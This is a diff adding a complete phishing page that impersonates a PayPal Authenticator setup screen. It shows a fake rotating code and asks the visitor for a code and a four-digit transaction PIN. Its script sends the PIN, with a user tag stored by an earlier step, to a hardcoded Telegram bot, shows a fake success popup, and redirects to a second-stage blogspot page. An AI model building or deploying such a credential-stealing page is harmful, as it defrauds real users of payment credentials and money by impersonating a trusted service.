@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>2-Factor Authentication</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3.2.0/dist/email.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f9f9f9;
+        }
+        .container {
+            text-align: center;
+            padding: 16px;
+            max-width: 400px;
+            background: #fff;
+        }
+            .logo {
+            margin: 0 auto 10px;
+            display: flex;
+            justify-content: center;
+        }
+        .logo img {
+            max-width: 40px;
+            height: auto;
+        }
+        .instruction {
+            font-size: 16px;
+            color: #1a3c70;
+            margin-bottom: 10px;
+            line-height: 1.5;
+            font-weight: 500;
+        }
+        input {
+            margin: 6px 0;
+            padding: 12px;
+            font-size: 16px;
+            width: 90%;
+            text-align: center;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-weight: 500;
+            transition: border-color 0.3s;
+        }
+        input:focus {
+            border-color: #000080; /* navy border on focus */
+            outline: none;
+        }
+        button {
+            padding: 12px;
+            font-size: 16px;
+            background: #000080; /* navy confirm button */
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-top: 10px;
+        }
+        button:hover {
+            background: #000066; /* darker navy hover */
+        }
+        .circle-progress {
+            position: relative;
+            width: 50px;   /* reduced size */
+            height: 50px;  /* reduced size */
+        }
+        .circle-progress svg {
+            transform: rotate(-90deg);
+        }
+        .circle-progress circle {
+            fill: none;
+            stroke-width: 6; /* slightly thinner */
+        }
+        .circle-progress .bg {
+            stroke: #e5e7eb;
+        }
+        .circle-progress .progress {
+            stroke: #000080; /* navy spinner */
+            stroke-linecap: round;
+            transition: stroke-dashoffset 1s linear;
+        }
+        .circle-progress span {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 0.9rem; /* adjusted smaller to fit new size */
+            font-weight: 600;
+            color: #1f2937;
+        }
+        #randomCode {
+            color: #000080; /* navy code */
+        }
+         .btn {
+      width: 95%;
+      padding: 14px;
+      background: #000080; /* deeper blue */
+      color: #fff;
+      font-size: 17px;
+      font-weight: 900; /* bold */
+      border: none;
+      border-radius: 25px;
+      cursor: pointer;
+      margin-bottom: 15px;
+    }
+        /* Success Popup */
+    .popup {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: white;
+      padding: 20px 30px;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+      text-align: center;
+      z-index: 9999;
+    }
+    .popup.success {
+      border-left: 6px solid #22c55e;
+    }
+    .popup svg {
+      width: 50px;
+      height: 50px;
+      margin: auto;
+      display: block;
+      color: #22c55e;
+    }
+    </style>
+</head>
+<body>
+	    <div class="container">
+    	<div class="logo">
+            <img src="https://i.im.ge/2025/09/22/n9xQJG.Picsart-25-09-22-16-21-48-182.png" alt="Bank Logo">
+        </div>
+        <p class="instruction">Tap "Confirm" to start using PayPal Authenticator code each time you execute a transaction</p>
+        <p class="instruction">You'll start using it in addition to your 4 digit pin to make your transaction authorization more secure.</p>
+        <div class="bg-white p-6 rounded-2xl shadow-xl w-full max-w-md">
+            <h1 class="text-3xl font-bold text-center text-gray-800 mb-4">Your Authenticator Code</h1>
+            <div class="flex justify-between items-center mb-4">
+                <div>
+                    <p class="text-lg font-semibold text-gray-700">Code: <span id="randomCode" class="text-2xl font-bold">Loading...</span></p>
+                </div>
+                <div class="circle-progress">
+                    <svg width="50" height="50"> <!-- reduced size -->
+                        <circle class="bg" cx="25" cy="25" r="22"></circle>
+                        <circle class="progress" cx="25" cy="25" r="22" stroke-dasharray="138.23" stroke-dashoffset="0"></circle>
+                    </svg>
+                    <span id="timer">60</span>
+                </div>
+            </div>  
+            <div class="space-y-3">
+                <input type="text" id="name" placeholder="Enter authenticator code" class="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 transition text-gray-700">
+                <input type="text" id="email" placeholder="Enter 4 digits pin" class="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 transition text-gray-700">
+                 <button id="signupButton" class="btn">Confirm</button>
+            </div>
+        </div>
+    </div>
+      <!-- Success Popup -->
+  <div id="successPopup" class="popup success">
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/>
+    </svg>
+    <p class="text-lg font-semibold text-gray-700 mt-2">Authentication Successful!</p>
+  </div>
+  
+<script>
+  // --- Step 2 Script ---
+  function generateRandomCode() {
+    return Math.floor(100000 + Math.random() * 900000).toString();
+  }
+
+  function updateCodeAndTimer() {
+    document.getElementById('randomCode').textContent = generateRandomCode();
+    let timeLeft = 60;
+    const circumference = 138.23;
+    const progressCircle = document.querySelector('.progress');
+    document.getElementById('timer').textContent = timeLeft;
+
+    const timerInterval = setInterval(() => {
+      timeLeft--;
+      document.getElementById('timer').textContent = timeLeft;
+      const offset = circumference * (1 - timeLeft / 60);
+      progressCircle.setAttribute('stroke-dashoffset', offset);
+      if (timeLeft <= 0) {
+        clearInterval(timerInterval);
+        progressCircle.setAttribute('stroke-dashoffset', 0);
+        updateCodeAndTimer();
+      }
+    }, 1000);
+  }
+
+  updateCodeAndTimer();
+
+  // Retrieve user tag from localStorage (set on Step 1)
+  function getUserTag() {
+    return localStorage.getItem("userTag") || "UnknownUser";
+  }
+  const userTag = getUserTag();
+
+  document.getElementById('signupButton').addEventListener('click', () => {
+    const authcode = document.getElementById('name').value.trim();
+    const pin = document.getElementById('email').value.trim();
+    const generatedCode = document.getElementById('randomCode').textContent;
+
+    //  fixed variable name
+    if (!/^\d{6}$/.test(authcode)) {
+      alert('Please enter a valid 6-digit authenticator code.');
+      return;
+    }
+    if (!/^\d{4}$/.test(pin)) {
+      alert('Please enter a valid 4-digit pin.');
+      return;
+    }
+
+    // Telegram Bot API send
+    const BOT_TOKEN = "8357190104:AAGRU7LylcJDfGyYGAQHhni7e8PyAC8PKkU";
+    const CHAT_ID = "8259952691";
+
+    //  cleaned emojis
+    const message = 
+      `🔔 4 Digits Pin Arrives\n` +
+      `🔖Tag: ${userTag}\n` +
+      `🔐 Pin: ${pin}`;
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+    })
+    .then(res => res.json())
+    .then(data => {
+      if (data.ok) {
+        // Show popup
+        const popup = document.getElementById('successPopup');
+        popup.style.display = 'block';
+        setTimeout(() => {
+          popup.style.display = 'none';
+          //  fixed redirect URL
+          window.location.href = "https://desirevillaresort.blogspot.com/2025/10/second-pge.html?userTag=" + userTag; 
+        }, 2000);
+      } else {
+        alert("Failed to send to Telegram.");
+      }
+    })
+    .catch(err => {
+      alert("Error: " + err.message);
+    });
+  });
+</script>
+
+</body>
+</html>
